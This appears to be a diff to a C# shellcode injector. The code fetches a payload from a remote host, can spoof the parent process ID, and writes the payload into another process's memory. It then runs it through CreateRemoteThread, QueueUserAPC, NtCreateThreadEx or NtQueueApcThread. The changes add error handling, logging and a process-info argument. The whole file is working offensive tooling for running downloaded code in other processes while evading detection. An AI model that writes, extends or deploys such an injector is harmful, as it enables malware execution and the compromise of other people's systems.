@@ -13,20 +13,28 @@ namespace Shellcode_Injector
         //Fetch the file from remote host
         public static byte[] Fetch(string host, string file)
         {
-            Console.WriteLine($"Fetching {file} from {host}");
-            WebClient client = new WebClient();
-            client.BaseAddress = host;
-            byte[] sc = client.DownloadData(file);
-            return sc;
+            try
+            {
+                Console.WriteLine($"Fetching {file} from {host}");
+                WebClient client = new WebClient();
+                client.BaseAddress = host;
+                byte[] sc = client.DownloadData(file);
+                return sc;
+            }
+            catch (WebException ex)
+            {
+                Console.WriteLine("An error occurred while making the HTTP request:");
+                throw new Win32Exception(ex.Message);
+            }
+            catch (ArgumentException ex)
+            {
+                throw new Win32Exception("Provide the host with a valid scheme: http/https");
+            }
         }
 
-        //Create proc and return the process information struct, its possible to spoof the ppid with an arbirary one
-        public static WinApi.PIN StartS(
-            bool spoof_ppid = false,
-            uint ppid = 0,
-            string cmd = "C:\\Windows\\System32\\notepad.exe",
-            string cwd = "C:\\Windows\\System32"
-            )
+        //Create proc and return the process information struct,
+        //its possible to spoof the ppid with an arbirary one
+        public static WinApi.PIN StartS(bool spoof_ppid, uint ppid, string cmd, string cwd)
         {
 
             var sin = new WinApi.SINEX();
@@ -107,7 +115,8 @@ namespace Shellcode_Injector
 
         //Allocate memory and write the shellcode - for CreateRemoteThread or QueueUserAPC
         public static IntPtr MWrite(IntPtr phand, byte[] sc) 
-        { 
+        {
+            Console.WriteLine("Allocating space trough virtual alloc");
             IntPtr our_place = WinApi.Allocate(
                 phand, 
                 IntPtr.Zero, 
@@ -124,6 +133,7 @@ namespace Shellcode_Injector
         // To be used with NtCreateThreadEx or NtQueueApcThread
         public static IntPtr NTMWrite(IntPtr phand, byte[] sc) 
         {
+            Console.WriteLine("Allocating space trough nt section");
             var hsec = IntPtr.Zero;
             var sc_size = (ulong)sc.Length;
             //Create new memory block section in the current process
@@ -170,36 +180,33 @@ namespace Shellcode_Injector
             return raddr;
         }
 
-        //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process handle, memory pointer
-        //In case of CreateRemoteThread phand should be process Handle
-        //In case of QueueUserAPC phand should be the main thread handle, also this is to work with CreateProcessW 
-        //until additional functionallity for enumerating the threads on remote process is included
-        public static void SCRun(string tchq, IntPtr phand, IntPtr mem) 
+        //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process info, memory pointer
+        public static void SCRun(string tchq, WinApi.PIN proc, IntPtr mem) //TODO pass in the process info struct
         {
             if (tchq == "crt")
             {
-                IntPtr rmth = WinApi.RemoteThread(phand, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+                Console.WriteLine("Executing the code trough creating remote thread");
+                IntPtr rmth = WinApi.RemoteThread(proc.hProcess, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                 WinApi.Waiter(rmth, (uint)WinApi.mem.end);
             } else if (tchq == "qua") 
             {
-                Console.WriteLine("Trying to run the code trough queue user apc");
-                WinApi.APC(mem, phand, 0);
-                WinApi.Resume(phand);
+                Console.WriteLine("Executing the code trough queue user apc");
+                WinApi.APC(mem, proc.hThread, 0);
+                WinApi.Resume(proc.hThread);
             }
         }
 
         //Run the shellcode trough ntdll.dll - techniques (NtCreateThreadEx, NtQueueApcThread)
-        //In case of NtCreateThreadEx phand should be process handle
-        //In case of NtQueueApcThread phand should be thread handle
-        public static void NTSCRun(string tchq, IntPtr phand, IntPtr mem) 
+        public static void NTSCRun(string tchq, WinApi.PIN proc, IntPtr mem) 
         {
             if (tchq == "ncte")
             {
+                Console.WriteLine("Executing the code trough nt create thread");
                 WinApi.cThread(
                     out _,
                     (ulong)WinApi.gen.thr_accs,
                     IntPtr.Zero,
-                    phand,
+                    proc.hProcess,
                     mem,
                     IntPtr.Zero,
                     false,
@@ -210,8 +217,9 @@ namespace Shellcode_Injector
                     );
             } else if (tchq == "nqat") 
             {
-                WinApi.NAPC(phand, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-                WinApi.Resume(phand);
+                Console.WriteLine("Executing the code trough nt queue APC thread");
+                WinApi.NAPC(proc.hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                WinApi.Resume(proc.hThread);
             }
         }
 
